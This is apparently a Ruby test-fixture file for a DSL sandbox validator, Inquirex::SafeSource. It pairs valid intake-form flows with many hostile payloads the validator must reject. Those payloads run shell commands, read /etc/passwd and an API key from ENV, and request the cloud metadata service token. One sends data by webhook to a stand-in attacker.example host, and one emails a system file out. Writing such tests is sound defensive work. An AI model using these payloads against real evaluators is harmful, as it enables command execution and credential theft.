# frozen_string_literal: true

# Test corpora for Inquirex::SafeSource: the flow DSL that must keep working,
# and the attack payloads that must never be evaluated.
#
# Every hostile source here is written with a non-interpolating heredoc
# (`<<~'RUBY'`) or a single-quoted string, so what the validator sees is
# literally what is on the page — an ordinary heredoc would let Ruby resolve
# `#{...}` before the test ever ran, which silently turns an interpolation
# attack into a harmless static string.
module DslPayloads
  module_function

  # The legitimate corpus. Between them these flows use every call the
  # allowlist permits, in every argument shape the DSL accepts.
  #
  # @return [Hash{String => String}] label => DSL source
  def accepted
    minimal_flows.merge(rich_flows)
  end

  # @return [Hash{String => String}]
  def minimal_flows
    {
      "minimal"                  => <<~RUBY,
        Inquirex.define do
          start :hello

          say :hello do
            text "Hello, world."
          end
        end
      RUBY
      "brace block"              => %(Inquirex.define { start :hello; say(:hello) { text "Hi" } }\n),
      "id and version keywords"  => <<~RUBY,
        Inquirex.define(id: "tax-intake-2026", version: "2.1.0") do
          start :hello

          say :hello do
            text "Hi"
          end
        end
      RUBY
      "magic comments"           => <<~RUBY,
        # frozen_string_literal: true
        # encoding: utf-8
        Inquirex.define do
          start :hello

          say :hello do
            text "Héllo, wörld — ünicode is fine."
          end
        end
      RUBY
      "comments and blank lines" => <<~RUBY,
        # A flow may be commented as heavily as its author likes.
        Inquirex.define do
          start :hello # trailing comment

          # leading comment
          say :hello do
            text "Hi" # another
          end
        end
      RUBY
      "every display verb"       => <<~RUBY,
        Inquirex.define do
          start :title

          header :title do
            text "Section one"
            transition to: :note
          end

          btw :note do
            text "By the way, this takes two minutes."
            transition to: :careful
          end

          warning :careful do
            text "Do not enter your Social Security number."
            transition to: :bye
          end

          say :bye do
            text "Thanks."
          end
        end
      RUBY
      "every data type"          => <<~RUBY
        Inquirex.define do
          start :a_string

          ask :a_string     do type :string     end
          ask :a_text       do type :text       end
          ask :an_integer   do type :integer    end
          ask :a_decimal    do type :decimal    end
          ask :a_currency   do type :currency   end
          ask :a_boolean    do type :boolean    end
          ask :an_enum      do type :enum       end
          ask :a_multi_enum do type :multi_enum end
          ask :a_date       do type :date       end
          ask :an_email     do type :email      end
          ask :a_phone      do type :phone      end
        end
      RUBY
    }
  end

  # @return [Hash{String => String}]
  def rich_flows
    {
      "readme example"          => readme_example,
      "email action heredocs"   => email_action_flow,
      "accumulators and prices" => accumulator_flow,
      "composed rules"          => composed_rules_flow,
      "literal shapes"          => literal_shapes_flow
    }
  end

  # The flow from examples/01_readme_example.rb: widget hints per target,
  # confirm gates, rule-guarded transitions, a static default.
  #
  # @return [String]
  def readme_example
    <<~RUBY
      Inquirex.define id: "tax-intake-2025", version: "1.0.0" do
        meta title: "Tax Preparation Intake", subtitle: "Let's understand your situation"
        start :filing_status

        ask :filing_status do
          type :enum
          question "What is your filing status?"
          options single: "Single", married_jointly: "Married Filing Jointly"
          widget target: :desktop, type: :radio_group, columns: 2
          widget target: :mobile,  type: :dropdown
          transition to: :dependents
        end

        ask :dependents do
          type :integer
          question "How many dependents?"
          default 0
          transition to: :business_income
        end

        confirm :business_income do
          question "Do you have business income?"
          transition to: :business_count, if_rule: equals(:business_income, true)
          transition to: :done
        end

        ask :business_count do
          type :integer
          question "How many businesses?"
          skip_if equals(:business_income, false)
          transition to: :done, requires_server: true
        end

        say :done do
          text "Thanks for completing the intake."
        end
      end
    RUBY
  end

  # Multi-line send_email bodies. Prism parses a dedented heredoc as an
  # InterpolatedStringNode whose parts are all plain StringNodes, so rejecting
  # that node class outright would break this — the reason
  # Validator#static_string? inspects the parts instead.
  #
  # @return [String]
  def email_action_flow
    <<~RUBY
      Inquirex.define id: "lead-intake" do
        allowed_domains "*.agentica.group", "example.com"
        meta title: "Lead Intake",
             brand: { name: "Agentica", logo: "https://cdn.example.com/logo.png" },
             theme: { brand: "#2563eb", radius: "18px", font: "Inter, system-ui" }
        start :name

        ask :name do
          type :string
          question "What is your name?"
          transition to: :email
        end

        ask :email do
          type :email
          question "Where can we reach you?"
        end

        action :client_receipt, if: not_empty(:email) do
          send_email to:       "{{email}}",
                     from:     "forms@agentica.group",
                     reply_to: "hello@agentica.group",
                     cc:       "archive@agentica.group",
                     subject:  "Thanks {{name}} — we got your inquiry",
                     headers:  { "X-Inquirex-Flow" => "lead-intake" },
                     text:     <<~TEXT,
                       Hi {{name}},

                       We received your answers and will reply within one business day.

                       {{answers_summary}}
                     TEXT
                     html:     <<~HTML
                       <p>Hi {{name}},</p>
                       {{answers_summary}}
                     HTML
        end
      end
    RUBY
  end

  # @return [String]
  def accumulator_flow
    <<~RUBY
      Inquirex.define do
        accumulator :price, type: :currency, default: 0
        accumulator :complexity, type: :integer, default: 0
        start :filing_status

        ask :filing_status do
          type :enum
          question "Filing status?"
          options single: "Single", married: "Married"
          price single: 200, married: 400
          accumulate :complexity, flat: 1
          transition to: :income_types
        end

        ask :income_types do
          type :multi_enum
          question "Select all income types."
          options ["W-2", "Business"]
          accumulate :price, per_selection: { "W-2": 50, "Business": 250 }
          transition to: :dependents
        end

        ask :dependents do
          type :integer
          question "How many dependents?"
          accumulate :price, per_unit: 25
          price per_unit: 5
          transition to: :state
        end

        ask :state do
          type :string
          question "Which state?"
          accumulate :price, lookup: { CA: 150, NY: 175 }
        end
      end
    RUBY
  end

  # @return [String]
  def composed_rules_flow
    <<~RUBY
      Inquirex.define do
        start :amount

        ask :amount do
          type :currency
          question "Property value?"
          transition to: :jumbo, if_rule: all(
            greater_than(:amount, 750_000),
            any(contains(:income_types, "Business"), less_than(:dependents, 3)),
            not_empty(:amount)
          )
          transition to: :done
        end

        say :jumbo do
          text "Jumbo review required."
          transition to: :done
        end

        say :done do
          text "Thanks."
        end
      end
    RUBY
  end

  # Literal shapes the DSL legitimately produces: arrays, nested hashes,
  # string-quoted symbol keys, underscored numerics, floats, booleans, nil.
  #
  # @return [String]
  def literal_shapes_flow
    <<~'RUBY'
      Inquirex.define do
        allowed_domains %w[a.example.com b.example.com]
        start :choices

        ask :choices do
          type :multi_enum
          question "Pick any."
          options({ "a-1": "First", "b_2": "Second", c: nil })
          widget type: :checkbox_group, columns: 3, dense: true, rows: 1.5, labels: %w[x y]
          default []
          transition to: :amount
        end

        ask :amount do
          type :decimal
          question "How much?"
          default 1_000.50
          transition to: :done
        end

        say :done do
          text "Line one. " \
               "Line two."
        end
      end
    RUBY
  end

  # Attack payloads, grouped by the category they exercise. Each one must be
  # rejected by Inquirex::SafeSource.validate.
  #
  # @return [Hash{String => String}] label => DSL source
  def rejected
    shell.merge(loading,
      reflection,
      capabilities,
      variables,
      definitions,
      interpolation,
      procs,
      arguments,
      structure,
      limits)
  end

  # @return [Hash{String => String}]
  def shell
    {
      "system"                => %(system("id")\nInquirex.define { start :a }\n),
      "backticks"             => %(`id`\nInquirex.define { start :a }\n),
      "%x command"            => %(%x{id}\nInquirex.define { start :a }\n),
      "backtick as verb text" => in_step('text `id`'),
      "exec"                  => %(exec("id")\n),
      "spawn"                 => %(spawn("id")\n),
      "fork"                  => %(fork { system("id") }\n),
      "Open3 in a rule"       => in_step('skip_if equals(:a, Open3.capture2("id"))')
    }
  end

  # @return [Hash{String => String}]
  def loading
    {
      "require"          => %(require "open3"\nInquirex.define { start :a }\n),
      "require_relative" => %(require_relative "x"\nInquirex.define { start :a }\n),
      "load"             => %(load "/tmp/payload.rb"\nInquirex.define { start :a }\n),
      "autoload"         => %(autoload :Open3, "open3"\nInquirex.define { start :a }\n)
    }
  end

  # @return [Hash{String => String}]
  def reflection
    {
      "eval"                    => %(eval("`id`")\n),
      "instance_eval"           => %(Inquirex.instance_eval("`id`")\n),
      "class_eval"              => %(Object.class_eval { }\n),
      "send"                    => %(Kernel.send(:system, "id")\n),
      "__send__"                => %(Object.__send__(:system, "id")\n),
      "public_send"             => %(Object.public_send(:system, "id")\n),
      "method"                  => %(method(:system).call("id")\n),
      "define_method"           => %(Inquirex.define do\n  define_method(:x) { }\n  start :a\nend\n),
      "binding"                 => in_step("text binding.inspect"),
      "caller"                  => in_step("text caller.to_s"),
      "ObjectSpace.each_object" => in_step("text ObjectSpace.each_object(Class).to_a.to_s"),
      # Split so no forbidden name appears literally in the source.
      "const_get by concat"     => in_step('text Object.const_get("Ker" + "nel").to_s')
    }
  end

  # @return [Hash{String => String}]
  def capabilities
    {
      "File.read"            => in_step('text File.read("/etc/passwd")'),
      "IO.read"              => in_step('text IO.read("/etc/passwd")'),
      "Dir.glob"             => in_step('text Dir.glob("/**/*").to_s'),
      "Kernel"               => in_step("text Kernel.rand.to_s"),
      "ENV"                  => in_step('text ENV["OPENAI_API_KEY"]'),
      "Process"              => in_step("text Process.pid.to_s"),
      "Marshal"              => in_step("text Marshal.load(payload).to_s"),
      "ActiveRecord"         => in_step("text Lead.pluck(:email).to_s"),
      "cloud metadata"       => in_step(
        'text URI.open("http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token").read'
      ),
      "bare constant"        => in_step("text SomeConstant"),
      "constant path"        => in_step("text Inquirex::VERSION"),
      "webhook effect"       => <<~RUBY,
        Inquirex.define do
          allowed_domains "attacker.example"
          start :a

          say :a do
            text "x"
          end

          action :exfiltrate do
            webhook url: "https://attacker.example/collect"
          end
        end
      RUBY
      "send_email file body" => <<~RUBY
        Inquirex.define do
          start :a

          say :a do
            text "x"
          end

          action :leak do
            send_email to: "attacker@example.com", subject: "hi", text: { file: "/etc/passwd" }
          end
        end
      RUBY
    }
  end

  # @return [Hash{String => String}]
  def variables
    {
      "instance variable" => in_step("text @secret"),
      "class variable"    => in_step("text @@secret"),
      "global variable"   => in_step("text $PROGRAM_NAME"),
      "local assignment"  => %(Inquirex.define do\n  payload = "id"\n  start :a\nend\n),
      "local read"        => in_step("text payload")
    }
  end

  # @return [Hash{String => String}]
  def definitions
    {
      "def"                  => %(def evil\n  `id`\nend\nInquirex.define { start :a }\n),
      "singleton def"        => %(def self.evil\nend\nInquirex.define { start :a }\n),
      "class"                => %(class Evil\nend\nInquirex.define { start :a }\n),
      "module"               => %(module Evil\nend\nInquirex.define { start :a }\n),
      "class << self"        => %(class << self\nend\nInquirex.define { start :a }\n),
      "alias"                => %(alias evil system\nInquirex.define { start :a }\n),
      "undef"                => %(undef puts\nInquirex.define { start :a }\n),
      "begin rescue"         => %(begin\n  Inquirex.define { start :a }\nrescue StandardError\nend\n),
      "begin in flow"        => %(Inquirex.define do\n  begin\n    start :a\n  rescue StandardError\n  end\nend\n),
      "rescue in block body" => %(Inquirex.define do\n  start :a\nrescue StandardError\n  `id`\nend\n),
      "at_exit"              => %(at_exit { `id` }\nInquirex.define { start :a }\n),
      "BEGIN block"          => %(BEGIN { }\nInquirex.define { start :a }\n),
      "END block"            => %(END { }\nInquirex.define { start :a }\n),
      "exit"                 => %(exit\nInquirex.define { start :a }\n)
    }
  end

  # @return [Hash{String => String}]
  # rubocop:disable Lint/InterpolationCheck -- these payloads must NOT interpolate
  def interpolation
    {
      "string interpolation"  => in_step('text "leak #{ENV["OPENAI_API_KEY"]}"'),
      "symbol interpolation"  => <<~'RUBY',
        Inquirex.define { start :"a#{`id`}" }
      RUBY
      "regexp interpolation"  => in_step('text /#{`id`}/.source'),
      "regexp literal"        => in_step("text /a/.source"),
      "heredoc interpolation" => <<~'RUBY',
        Inquirex.define do
          start :a

          say :a do
            text <<~BODY
              Your key is #{ENV["OPENAI_API_KEY"]}
              and that is that.
            BODY
          end
        end
      RUBY
      "%W interpolation"      => in_step('options %W[a#{`id`}]'),
      "concat with interp"    => in_step('text "safe " "unsafe #{`id`}"'),
      "__FILE__"              => in_step("text __FILE__"),
      "__dir__"               => in_step("text __dir__"),
      "__method__"            => in_step("text __method__.to_s")
    }
  end
  # rubocop:enable Lint/InterpolationCheck

  # @return [Hash{String => String}]
  def procs
    {
      "compute block"    => <<~RUBY,
        Inquirex.define do
          start :a

          ask :a do
            type :integer
            question "How many?"
            compute { |answers| `id` }
          end
        end
      RUBY
      "default block"    => <<~RUBY,
        Inquirex.define do
          start :a

          ask :a do
            type :string
            question "Which state?"
            default { |answers| system("id") }
          end
        end
      RUBY
      "default lambda"   => in_step("default ->(answers) { `id` }"),
      "action run block" => <<~RUBY
        Inquirex.define do
          start :a

          say :a do
            text "x"
          end

          action :evil do
            run { |answers, outbox| system("id") }
          end
        end
      RUBY
    }
  end

  # @return [Hash{String => String}]
  # rubocop:disable Lint/InterpolationCheck -- these payloads must NOT interpolate
  def arguments
    {
      "ENV in a rule value"      => in_step('transition to: :a, if_rule: equals(:a, ENV["OPENAI_API_KEY"])'),
      "backtick rule value"      => in_step("skip_if equals(:a, `id`)"),
      "method call as rule"      => in_step('skip_if system("id")'),
      "expression rule value"    => in_step("skip_if greater_than(:a, 1 + 1)"),
      "rule with a block"        => in_step("skip_if not_empty(:a) { `id` }"),
      "splat argument"           => %(Inquirex.define do\n  start(*[:a])\nend\n),
      "double splat argument"    => in_step("transition(**{ to: :a })"),
      "block pass"               => %(Inquirex.define(&:tap)\n),
      "unknown keyword"          => in_step("transition to: :a, unless_rule: nil"),
      "unknown step keyword"     => in_step('shell_out "id"'),
      "unknown flow keyword"     => %(Inquirex.define do\n  start :a\n  sabotage :yes\nend\n),
      "widget non-literal"       => in_step("widget type: :radio_group, columns: Kernel.rand"),
      "options non-literal"      => in_step("options Lead.pluck(:email)"),
      "hash double splat"        => in_step("options({ **{} })"),
      "interpolated hash key"    => in_step('options({ "x#{`id`}": "First" })'),
      "unknown data type"        => in_step("type :sneaky"),
      "unknown accumulator type" => %(Inquirex.define do\n  accumulator :price, type: :bogus\n  start :a\nend\n),
      "interpolated type"        => in_step('type :"#{`id`}"'),
      "too many arguments"       => %(Inquirex.define do\n  start :a, :b\nend\n)
    }
  end
  # rubocop:enable Lint/InterpolationCheck

  # @return [Hash{String => String}]
  def structure
    {
      "two define blocks"     => %(Inquirex.define { start :a }\nInquirex.define { start :b }\n),
      "trailing statement"    => %(Inquirex.define { start :a }\n`id`\n),
      "leading statement"     => %(`id`\nInquirex.define { start :a }\n),
      "not a define"          => %(Attacker.define { start :a }\n),
      "safe navigation"       => %(Inquirex&.define { start :a }\n),
      "toplevel constant"     => %(::Kernel.system("id")\n),
      "define without block"  => %(Inquirex.define\n),
      "block parameters"      => %(Inquirex.define do |builder|\n  builder.start :a\nend\n),
      "conditional statement" => %(Inquirex.define do\n  start :a if true\nend\n),
      "loop statement"        => %(Inquirex.define do\n  3.times { start :a }\nend\n),
      "case statement"        => %(Inquirex.define do\n  case 1\n  when 1 then start :a\n  end\nend\n),
      "and/or"                => %(Inquirex.define do\n  start(:a) || `id`\nend\n),
      "unknown entry keyword" => %(Inquirex.define(cheat: true) { start :a }\n),
      "__END__ data section"  => <<~RUBY,
        Inquirex.define do
          start :a

          say :a do
            text "x"
          end
        end
        __END__
        `id`
      RUBY
      "foreign encoding"      => %(# encoding: Shift_JIS\nInquirex.define { start :a }\n),
      "comments only"         => "# nothing but a comment\n",
      "blank"                 => "",
      "whitespace only"       => "\n  \n"
    }
  end

  # @return [Hash{String => String}]
  def limits
    {
      "over the size cap"  => "Inquirex.define do\n  start :a\n" \
                              "#{"  # padding padding padding padding padding padding\n" * 2_000}end\n",
      "over the depth cap" => "Inquirex.define do\n  start :a\n  ask :a do\n    type :string\n    " \
                              "skip_if #{"all(" * 40}not_empty(:a)#{")" * 40}\n  end\nend\n"
    }
  end

  # Wraps a single hostile statement in an otherwise valid flow, so the only
  # thing under test is the statement itself.
  #
  # @param statement [String] one line of DSL to place inside a step block
  # @return [String] complete DSL source
  def in_step(statement)
    <<~RUBY
      Inquirex.define do
        start :a

        ask :a do
          type :string
          #{statement}
        end
      end
    RUBY
  end
end
